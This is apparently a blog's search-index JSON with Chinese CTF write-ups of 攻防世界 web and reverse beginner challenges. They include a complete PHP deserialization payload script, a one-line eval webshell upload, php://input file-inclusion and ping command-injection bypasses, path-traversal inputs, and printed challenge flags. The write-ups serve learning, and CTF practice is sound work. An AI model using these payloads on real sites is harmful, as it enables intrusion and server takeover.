[{"title":"ctf web中的php反序列化与正则表达式","url":"/2023/09/06/web2/","content":"\n> 今天又做了一道php反序列化的题目，感觉又学会了很多新知识，并且意识到php反序列化的知识点比较多而杂，所以新开一篇文章记录一下，之后再做到类似的题也会继续更新。\n\n## 一、引入题：攻防世界-Web_php_unserialize\n\n我前几天也做过一道类似的题目，在我的上一篇博客中的**unserialize3**中有过简单的利用反序列化。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906201816.png\" title=\"\" alt=\"\" width=\"565\">\n\n这题主要利用了绕过wakeup函数的方法，很简单，就是将对象数量改成大于原本数量的数字就可以。之前只知道这样做题是对的，但是今天又得知了一些新的知识点。\n\n如果反序列化的时候发现字符串中的对象数量大于真实对象数量的时候，会不执行wakeup函数，而是执行__destruct()函数。今天做的题目就是利用了这个特性。\n\n## 二、Web_php_unserialize\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906202150.png\" title=\"\" alt=\"\" width=\"507\">\n\n这题点进环境就可以看见源代码\n\n```php\n<?php \nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) { \n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() { \n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) { \n    $var = base64_decode($_GET['var']); \n    if (preg_match('/[oc]:\\d+:/i', $var)) { \n        die('stop hacking!'); \n    } else {\n        @unserialize($var); \n    } \n} else { \n    highlight_file(\"index.php\"); \n} \n?>\n```\n\n根据我们上面阐述的原理，只需要绕过wakeup函数并且反序列化里面的file名字为fl4g.php即可。但是需要先通过preg_match函数检测，这里用到了正则表达式，所以我又恶补了一下正则表达式的用法。\n\n本题代码的意思是在 $var 这个字符串中查找是否有以 o 或 c 开头，后面跟着一个冒号，再跟着一个或多个数字，再跟着一个冒号的**子串**。如果找到了，就返回 1，否则返回 0。/i 这个修饰符表示忽略大小写，所以 O 或 C 也可以匹配。\n\n<mark>注意是子串即可</mark>，我最开始误以为必须是以 oc 开头，经过实际测试才发现是子串。\n\n同时\\d表示的是一个数字，也就是[0,9]。\n\n<center>-----------------------✂---------------------------</center>\n\n### 正则表达式中的一些常见用法：\n\n- []表示匹配的是字符（包括数字）范围，如[oc] 匹配的是o或c，[asd]匹配的则是a s d中的任意一个，[A-Z]则匹配的是大写字母A-Z，[a-z],[0-9]同理。但是，**如果加上^则变成了取反集，也就是[^1234]匹配的是字符串中非1234的数字**。\n\n- \\d表示的是匹配一个数字，也就是[0,9]的范围，而\\w匹配的则是字符，\\s匹配的是空格。有趣的是，**\\D \\W \\S 这三个分别匹配的是非数字 非字符和非空格，相当于取反集了**\n\n- +表示的是至少出现一次，也就是匹配多次，而{n}则是匹配n次，这个问题可以看下面的几个对比图\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906203829.png\" alt=\"\" width=\"261\"><img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906203853.png\" alt=\"\" width=\"204\"><img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906203914.png\" alt=\"\" width=\"167\">\n\n由此可见匹配次数也就是说的是匹配字符串的大小\n\n- $表示匹配从字符串末尾开始，如图，从末尾开始匹配，如果加上‘+’则匹配到的是123。同理^匹配从字符串开头开始，如图，但是需要放到前面，+始终放在后面。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906204122.png\" title=\"\" alt=\"\" width=\"164\"><img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906204456.png\" title=\"\" alt=\"\" width=\"154\">\n\n上面是一些常用的正则表达式用法（好像扯远了）\n\n<center>-----------------------✂---------------------------</center>\n\n回到上面的题目，要想成功执行反序列化代码，则先需要给我们的字符串用base64加密，然后还得通过正则表达式的判断。正常的字符串输出如下\n\nO:4:\"Demo\":1:{s:10:\"Demofile\";s:8:\"fl4g.php\";}\n\n则我们可以把O:4变为O:+4,就可以通过正则表达式的判断了。之后只需要将对象数量改为2就可以了。但是下面是最坑的地方，如果你直接拿着字符串去加密然后发过去是**错误的**！！\n\n经过Google之后发现了新的知识点：**不同属性的对象序列化之后的字符格式并不一样**\n\n```html\nPrivate属性 ： 数据类型:属性名长度:\\00类名\\00属性名;数据类型:属性值长度:属性值;\nProtected属性 ： 数据类型:属性名长度:\\00*\\00属性名;数据类型:属性值长度:属性值;\nPublic属性 ： 数据类型:属性名长度:属性名;数据类型:属性值长度:属性值;\n```\n\n从上面可以看到，本题是private属性，左右两边会有一个\\00，而字符串输出的时候是复制不到这两个\\00的，而之前的那道题没有这个问题是因为那个是public属性。所以这题需要一次性输出完成才可以。我感觉或许这也是题中base64编码的原因，这样就降低了难度。\n\n所以最后的exp如下\n\n```php\n<?php\nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) { \n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() { \n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\n$c = new Demo(\"fl4g.php\");\n$a = serialize($c);\n$a = str_replace(\"O:4\",\"O:+4\",$a);\n$a = str_replace(\":1:\",\":2:\",$a);\nprint(serialize($c));\nvar_dump(base64_encode($a));\n?>\n```\n\n将输出直接输入到题目中即可获得flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906210306.png)\n","tags":["ctf回顾","反序列化"],"categories":["ctf","技术栈：反序列化"]},{"title":"2023羊城杯ctf - web补题","url":"/2023/09/03/yang/","content":"\n> 这次的ctf又是做了一天的牢，奋战一天还是没有突破零。看完题解才发现我本来以为就差一点的题目原来还有很多问题，看来还得是先积累知识啊。\n\n## 一、D0n’t pl4y g4m3!!!\n","tags":["ctf补题"],"categories":["ctf"]},{"title":"攻防世界web引导模式 11-20题","url":"/2023/08/28/web1/","content":"\n>  先开个坑，也不知道什么时候能写完\n\n## 一、simple_js\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162340.png\" title=\"\" alt=\"\" width=\"327\">\n\n这题很简单，先用burp抓包就可以发现源码，观察源码也不知道在搞啥巴拉巴拉，放到vscode上运行一下，发现无论输入啥这个函数输出都是一样的，那么也就是这个函数其实无意义。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162413.png\" title=\"\" alt=\"\" width=\"351\">这时候就会发现下面还有一串字符，拿去python输出一下，发现是一串数字，给他转成ascii，就会出现flag\n\n```python\nprint(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")\nflag = \"55,56,54,79,115,69,114,116,107,49,50\"\nflag_1 = flag.split(\",\")\nprint(flag_1)\nflag2 = ''\nfor x in flag_1:\n     flag2 += chr(int(x))\nprint(flag2)\n\n# Cyberpeace{786OsErtk12}\n```\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162643.png)\n\n## 二、baby_web\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162736.png\" title=\"\" alt=\"\" width=\"390\">\n\n这题很简单，先点进去发现转到了1.php的路径，并且提示我们最初的页面\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162959.png)\n\n然后用burp进入index.php，就可以发现flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903162946.png)\n\n## 三、PHP2\n\n这题刚点进去如下，迷迷糊糊用burp抓包一下，也是啥也没有。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903164036.png)\n\n没办法直接用dirb扫描目录\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903165507.png\" title=\"\" alt=\"\" width=\"472\">\n\n也是啥也没扫出来，没办法google一下，发现了有phps的后缀文件，这种文件就是专门用了存php文件的源代码的，但是只有某些特殊情况才会有（记下来）\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903165616.png\" title=\"\" alt=\"\" width=\"351\">这样就可以发现源代码了，根据源代码设计id，但是id不能等于admin。根据源代码，我们可以让id = %61dmin，这样%61就会解码为a，但是发现还是不行，后来搜索得到浏览器会自动完成一次解码，所以还需要将%61再编码为%2561，就可以通关了，得到flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903170002.png)\n\n## 四、ics-06\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903170942.png\" title=\"\" alt=\"\" width=\"561\">\n\n这题如提示，进入之后只有一个可以进入\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903171019.png\" title=\"\" alt=\"\" width=\"468\">\n\n那就是报表中心，进入之后发现是日期，但是咋改都没有反应，然后放到burp里面抓包，这时候发现了后面竟然带了一个id=1？似乎有问题，然后直接拿去爆破，先设置1到3000的范围，开始爆破\n\n<img src=\"file:///C:/Users/打工人/AppData/Roaming/marktext/images/2023-09-03-17-12-35-image.png\" title=\"\" alt=\"\" width=\"460\">\n\n爆破到2333的时候发现长度明显不一样了，点进去发现flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903172712.png)\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230903172745.png\" alt=\"\" width=\"374\">\n\n## 五、php_rce\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905153458.png\" title=\"\" alt=\"\" width=\"386\">\n\n这题最开始做的时候确实摸不到头脑，进去之后是一个thinkphp的页面，并且提示你版本是v5，然后直接拿去Google，并且结合题目名字为phprce，则应该是找漏洞。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905153610.png)\n\n找到v5的漏洞，直接用一下看看有没有效果\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905153630.png\" title=\"\" alt=\"\" width=\"531\">\n\n可以看到命令成功执行，RCE成功\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905153707.png)\n\n之后就是直接ls / 然后找到flag cat一下就可了，得到flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905153807.png)\n\n## 六、unserialize3\n\n<img src=\"file:///C:/Users/打工人/AppData/Roaming/marktext/images/2023-09-05-15-41-38-image.png\" title=\"\" alt=\"\" width=\"375\">\n\n结合题目名字unserialize（反序列化）可以得知这题应该和序列化与反序列化有关。进入网址，如下，发现是php代码，则直接去Google搜索php反序列化，我参考的是[这篇文章](https://www.cnblogs.com/youyoui/p/8610068.html)。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905154105.png\" title=\"\" alt=\"\" width=\"499\">\n\n然后根据代码是如果触发了wakeup函数，就会认为是恶意代码，这也就说明了我们需要绕过wakeup函数才可以得到flag。然后后面是？code=，也就说明让我们自己补充后面的代码使得可以绕过wakeup函数。然后通过Google搜索得到**wakeup方法的漏洞**：\n\n若在对象的魔法函数中存在的__wakeup方法，那么之后再调用 unserilize() 方法进行反序列化之前则会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。则先补全一下代码，然后输出一下序列化后的数据\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905164723.png)\n\n则可以改为O:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}进行输入，就可以得到flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905164832.png)\n\n## 七、Web_php_include\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905191820.png\" title=\"\" alt=\"\" width=\"401\">\n\n这题进入环境是php代码，如下\n\n```php\n<?php\nshow_source(__FILE__);\necho $_GET['hello'];\n$page=$_GET['page'];\nwhile (strstr($page, \"php://\")) {\n    $page=str_replace(\"php://\", \"\", $page);\n}\ninclude($page);\n?>\n```\n\n显然是文件包含漏洞，搜索一下，主要参考下面这篇文章\n\n[✔PHP文件包含漏洞全面总结 - Zeker62 - 博客园 (cnblogs.com)](https://www.cnblogs.com/Zeker62/p/15322771.html#php%E4%BC%AA%E5%8D%8F%E8%AE%AE)\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905192232.png)\n\n利用php://input写入我们的代码，但是本题过滤掉了php://,这里我们就可以用大写来绕过这个判断，因此输入如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905192338.png)\n\n代码注入成功，并且执行了我们的代码，可以发现flag所在的文件，直接cat一下，就可以发现flag\n\n## 八、upload1\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905203924.png\" title=\"\" alt=\"\" width=\"418\">\n\n通过这题熟悉了一些中国蚁剑的用法，感觉还是很nb的。做题过程中主要参考文章如下：\n\n[CTF-WEB：经典文件上传漏洞 博客园 (cnblogs.com)](https://www.cnblogs.com/linfangnan/p/15784968.html)\n\n首先进入题目，抓包一下，发现部分源码，可以发现上传的文件后缀必须为jpg和png，其他都是无效的。同时也没有做更多限制，所以这题难度还是比较小的。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204242.png\" title=\"\" alt=\"\" width=\"404\">\n\n直接新建txt文件，写php代码，然后改后缀为jpg，则发现可以上传。这时候抓包一下：\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204614.png)\n\n直接在request头里面把1.jpg改为1.php就可以绕过了\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204532.png)\n\n然后1.php放的是一句话木马，关于这句话的解释可就大有来头了，new bing如是说：\n\n**这句代码是一个 PHP 的一句话木马，它的作用是执行 HTTP POST 方式传递的 ant 参数中的 PHP 代码。它的工作原理是：**\n\n- 首先，使用 eval() 函数，它可以将一个字符串作为 PHP 代码来执行。\n- 然后，使用 $_POST[‘ant’] 获取 HTTP POST 方式传递的 ant 参数的值，这个值是一个字符串，可能包含任意的 PHP 代码。\n- 最后，将 $_POST[‘ant’] 的值作为 eval() 函数的参数，执行其中的 PHP 代码。\n\n**这样，攻击者就可以通过向服务器发送 HTTP POST 请求，携带 ant 参数，来远程执行任意的 PHP 代码。这是非常危险的，因为攻击者可以利用这个漏洞来获取服务器的敏感信息，或者对服务器进行破坏或控制。**\n\n然后上传成功后就是链接中国蚁剑了，找到他返回的文件名当做url地址，ant为密码，他就自动获得shell了，很简单。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204827.png)\n\n拿到shell！之后就是去上层找到flag.php打开就可发现flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204910.png\" title=\"\" alt=\"\" width=\"530\">\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905204944.png\" title=\"\" alt=\"\" width=\"526\">\n\n## 九、warmup\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230905205215.png\" title=\"\" alt=\"\" width=\"447\">\n\n先打开环境发现就一张图片，没有其他信息，老规矩，先去burp抓包分析，发现提示source.php\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906081001.png\" title=\"\" alt=\"\" width=\"434\">\n\n然后打开source.php发现源码，可以发现还有另一个hint.php，打开发现提示flag的位置\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906081053.png)\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906081214.png)\n\n**flag not here, and flag in ffffllllaaaagggg**\n\n接下来就继续看source.php源码了\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906091424.png\" title=\"\" alt=\"\" width=\"439\">\n\n根据源码容易分析出，输入的file参数需要是字符串并且可以通过检测，而且从检测函数容易得到只要：\n\n- 第一个if语句：输入的为字符串并且在白名单里面\n\n- 第二个if语句则截取输入在？前的部分检测是否在白名单里面\n\n- 第三个 if 语句前先对变量url解码，然后和第二个if语句一样进行检验\n\n这样容易看出我们可以构建hint.php?dddd类似的输入来绕过判断进入include，并且结合之前的提示，我做的时候是挨个试，例如\n\nhint.php?../ffffllllaaaagggg   hint.php?../../ffffllllaaaagggg\n\nhint.php?../../../ffffllllaaaagggg 最后是hint.php?../../../../../ffffllllaaaagggg成功出现flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906101236.png)\n\n接下来是**为什么hint.php?../../../../../ffffllllaaaagggg可以起效果**？\n\n根据php文档，如下，容易看出只要出现../，include函数就会默认以它开头，而忽略掉hint.php，这就是可以起效果的原因。\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230906101353.png\" alt=\"\" width=\"494\" data-align=\"inline\">\n","tags":["ctf回顾"],"categories":["ctf","攻防世界新手题"]},{"title":"攻防世界ctf-web新手引导题前十题wp","url":"/2023/07/30/web0/","content":"\n> 最近做逆向题还是有点痛苦，又逐渐回想起当初玩web时候的感觉了。。所以我准备还是逆向和web一起搞，近期先高强度更新一波web再说。\n\n## 一、robots\n\n这题算是让我学到了robots协议是什么，简单理解就是爬虫协议，搜索引擎访问网站的时候第一个访问的协议，就是在里面标明哪些不可以被爬取，而一般都在根目录下面的robots.txt\n\n如下面这题，提示给了robots协议，然后就进入场景，直接进入robots.txt目录\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731163139.png\" title=\"\" alt=\"\" width=\"353\">\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731163225.png\" title=\"\" alt=\"\" width=\"358\">\n\n发现他不让访问这个php文件，看这个格式显然就是flag，然后进入该目录，得到flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731163321.png\" title=\"\" alt=\"\" width=\"252\">\n\n## 二、backup\n\n这题提示是找备份文件，我就直接去网上搜备份文件的格式，搜到常见的备份文件后缀名有：“.git” 、“.[svn](https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020)”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf”，\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731163814.png\" title=\"\" alt=\"\" width=\"360\">\n\n然后我就挨个在index.php后面加这些后缀试，当试到bak的时候提示下载了一个文件，打开文件发现flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731163944.png\" title=\"\" alt=\"\" width=\"340\">\n\n## 三、cookie\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731164609.png\" title=\"\" alt=\"\" width=\"322\">\n\n我发现攻防世界的web题比逆向题好多了啊。。web题每一道题都能学到知识点。\n\n这题就是提示cookie，那之前直接F12控制台的方法肯定就不行了，我就打开burpsuite抓包，第一次抓包如下\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731164747.png\" title=\"\" alt=\"\" width=\"343\">\n\n提示我看cookie.php文件，直接打开：根据提示发现flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731164833.png\" title=\"\" alt=\"\" width=\"330\">\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230731164900.png\" title=\"\" alt=\"\" width=\"332\">\n\n## 四、disabled_button\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803120939.png\" title=\"\" alt=\"\" width=\"364\">\n\n这题我也是百思不得其解，最后百度了一下，给我打开了一扇新世界的大门，F12还可以这样用。具体做法就是进入网页，打开控制台，发现按钮是被一个disabled给限制了，所以就直接把disabled给删了。。再点一下按钮，就成了。很简单\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803122147.png\" title=\"\" alt=\"\" width=\"237\"><img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803122203.png\" title=\"\" alt=\"\" width=\"196\">\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803122219.png\" title=\"\" alt=\"\" width=\"338\">\n\n得到flag：**cyberpeace{ecdd98d4be9a96b82b45b5cd15bda412}**\n\n## 五、get_post\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803121709.png\" title=\"\" alt=\"\" width=\"314\">\n\n这题十分简洁明了，进去之后发现如下提示\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803121738.png\" title=\"\" alt=\"\" width=\"335\">\n\n那就直接burpsuite，发送到repeater，提交如下\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803121831.png\" title=\"\" alt=\"\" width=\"224\"><img title=\"\" src=\"file:///C:/Users/打工人/AppData/Roaming/marktext/images/2023-08-03-12-19-22-image.png\" alt=\"\" width=\"268\">\n\n然后反馈如上，那就再来一个，并改成post，就会回复flag：\n\n**cyberpeace{cade2d4f80d9fb03404ea5776b70c55b}**\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230803121949.png\" title=\"\" alt=\"\" width=\"439\">\n\n## 六、weak_auth\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230804133252.png\" alt=\"\" width=\"335\">\n\n这题就是先进入网址，发现是一个登录页面，先随便输入一下，弹到下面的网页，发现有check.php目录，然后F12，发现提示\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822102059.png\" title=\"\" alt=\"\" width=\"394\">\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822102158.png)\n\n根据dictionary，就知道需要密码爆破了，然后用burpsuite爆破就好\n\n关于爆破步骤，第一次用还是有点不太熟练。先随便输入一下用户名和密码，找到request，如下，这样就找到了爆破的位置，发送到intruder，然后这题是已经知道账户名为admin，所以只需要爆破密码就行了\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822102517.png\" title=\"\" alt=\"\" width=\"319\">\n\n如下，爆破位置在1122处\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822102718.png\" title=\"\" alt=\"\" width=\"615\">\n\n然后如果已经有字典了的话直接加载字典，用simple list方式爆破，就会爆破出来密码为123456，输入进去得到flag\n\n## 七、simple_php\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822105153.png\" title=\"\" alt=\"\" width=\"359\">\n\n这个是一段php代码，很坑，主要涉及字符串转换，经过实测这个php版本应该是8.0之前的。先看代码\n\n```php\n﻿<?php\nshow_source(__FILE__);\ninclude(\"config.php\");\n$a=@$_GET['a'];\n$b=@$_GET['b'];\nif($a==0 and $a){\n    echo $flag1;\n}\nif(is_numeric($b)){\n    exit();\n}\nif($b>1234){\n    echo $f﻿lag2;\n}\n?>\n```\n\n目的就是要一起输出flag1和flag2，看条件，a需要为0且a的布尔值为1，然后由于是两个=，所以不是强比较，所以可以把a设成abcd，任意字符串就行，php在8.0之前的版本没有弱比较这个概念，会先尝试把abcd转换为数字，发现转换不了就返回0，符合a==0，之后由于任意的字符串布尔值均为true，所以第一个判断可以顺利通过。\n\n第二个判断则需要b不为数字且大于1234，所以可以设成9999ca，什么的，这样php在尝试转换数字的时候会从头尽可能的提取数字，并且9999ca也不是数字，就通过两个测试，获得flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230822105117.png\" title=\"\" alt=\"\" width=\"354\">\n\n## 八、command_execution\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828150222.png\" title=\"\" alt=\"\" width=\"305\">\n\n这题主要有关的知识点是ping，百度了一下也了解了一些相关的知识。\n\n简单理解一下，ping就是利用ip的唯一性，来检查两个ip地址之间是否连通以及时延多少。\n\n而这题里面说没有waf，则可以直接ping注入。\n\n下面参考文章：[本题题解](https://blog.csdn.net/m0_62094846/article/details/120937734)，[waf](https://www.cnblogs.com/realjimmy/p/12937247.html)\n\n[注入原理]\n\n| 的作用为将前一个命令的结果传递给后一个命令作为输入\n\n&&的作用是前一条命令执行成功时，才执行后一条命令\n\n掌握有关命令执行的知识\n\nwindows 或 linux 下:\n\ncommand1 && command2 先执行 command1，如果为真，再执行 command2\n\ncommand1 | command2 只执行 command2\n\ncommand1 & command2 先执行 command2 后执行 command1\n\ncommand1 || command2 先执行 command1，如果为假，再执行 command2\n\n命令执行漏洞（| || & && 称为 管道符）\n\n然后就可以先查看一下本地路径了\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828151901.png\" title=\"\" alt=\"\" width=\"250\"><img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828151952.png\" alt=\"\" width=\"300\">\n\n如上左图，发现路径，按照经验找home，如上右图，发现flag，cat一下即可得到\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828152050.png\" title=\"\" alt=\"\" width=\"303\">\n\n## 九、xff_referer\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828152551.png)\n\n这题也是增长知识的一题。主要涉及知识点xff和referer，百度一下\n\n**X-Forwarded-For**是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段，也就是告诉web网址来访者的ip。\n\n**HTTP Referer**是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段，通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip\n\n也就是说， xff负责说明来源ip，referer负责说明来源网页链接，而且这两个都是可以伪造的，用法就是\n\n```\nX-Forwarded-For: ip地址\nReferer: 来源网址\n```\n\n如图，先按要求伪造ip地址，收到回复需要伪造来源网址，继续伪造即可获得flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153214.png)\n\nflag如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153255.png)\n\n## 十、Training-WWW-Robots\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153441.png\" title=\"\" alt=\"\" width=\"375\">\n\n这题说实话是我最早做的web题，当时还不知道robots.txt是啥，就根据英文提示一步一步按照路径就解出来了，很简单。如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153548.png)\n\n打开网页是让我们学习robots协议，前面也做过这样的题，robots协议就是爬虫规范协议，来阻断一些不规范的爬虫行为，然后直接按路径进入robots.txt，发现不可以访问的路径，直接进入就可获得flag\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153718.png\" title=\"\" alt=\"\" width=\"252\"><img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230828153743.png\" alt=\"\" width=\"343\">\n\n## 十一、总结\n\n- robots协议是爬虫规范协议，有一个robots.txt放在根目录下面，需要的时候应该注意一下这个路径\n\n- 当跟备份文件有关的时候，要知道备份文件是在原文件名字基础上加入以下后缀：“.git” 、“.[svn](https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020)”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf”\n\n- 有些在前端代码动手脚的，可以直接F12改前端代码，没准有效果\n\n- $_GET[]获得的是request query里面的变量，就是在url中的变量\n\n说实话这篇文章我写了好久好久，中间因为实习的一些事情断了好久。今天可算是写完了。害\n\n下面，我将进入一段高产期（doge）\n","tags":["ctf回顾"],"categories":["ctf","攻防世界新手题"]},{"title":"攻防世界ctf-rev新手题","url":"/2023/07/27/rev2/","content":"\n## 一、insanity\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727163909.png\" title=\"\" alt=\"\" width=\"354\">\n\n经典拖进ida就有flag（这题目难度有3？），点进strs，得到flag：\n\n9447{This_is_a_flag}  果然是引导题的第一题，好简单\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727163955.png\" title=\"\" alt=\"\" width=\"337\">\n\n## 二、open-source\n\n这题附件是一个c文件，有点意思，好久没做过类似的题了。\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727165704.png\" alt=\"\" width=\"540\">\n\n很简单，就需要分析一下代码。\n\n就可以得到first = 0xcafe\n\nsecond % 17 = 8\n\nargv[3] = h4cky0u\n\n然后直接带入最后的式子运行一下就行了，如下\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727165855.png\" 